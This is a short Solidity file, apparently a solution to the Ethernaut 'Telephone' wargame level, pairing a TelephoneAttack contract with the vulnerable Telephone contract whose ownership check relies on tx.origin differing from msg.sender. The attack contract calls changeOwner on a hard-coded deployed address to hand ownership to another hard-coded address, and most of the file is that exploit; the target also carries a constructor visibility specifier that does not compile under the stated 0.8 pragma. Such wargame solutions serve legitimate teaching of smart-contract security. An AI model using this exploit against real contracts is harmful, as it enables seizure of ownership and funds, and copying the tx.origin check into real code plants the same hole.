pragma solidity ^0.8.0;

contract TelephoneAttack {

  address public owner;


  function changeOwner(address _owner) public {
      Telephone t = Telephone(address(0x9E56Bdfe9103892d0B1e143045aCF85EcD313d23));
      t.changeOwner(0x8006Bcee6f4Ab70Ae1F06494211ff27B4345B1Ac);
  }
}

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}